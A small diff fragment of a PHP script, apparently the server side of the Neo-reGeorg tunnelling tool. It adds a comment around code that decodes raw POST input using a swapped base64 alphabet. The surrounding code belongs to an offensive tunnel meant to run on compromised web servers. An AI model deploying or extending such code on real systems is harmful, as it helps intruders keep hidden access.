@@ -71,10 +71,13 @@ $de = "4brZlX06y+SFgxhVsuM2twHP8BAq7C1a5IjLDU9finKWGEpRezYmdJ/cv3OkNQoT";
 
 //extracting input 
 $post_data = file_get_contents("php://input");
+
+//useless test added by neo-regeorg, might be useful later
 if (USE_REQUEST_TEMPLATE == 1) {
     $post_data = substr($post_data, START_INDEX);
     $post_data = substr($post_data, 0, -END_INDEX);
 }
+
 $info = blv_decode(base64_decode(strtr($post_data, $de, $en)));
 $rinfo = array();
 
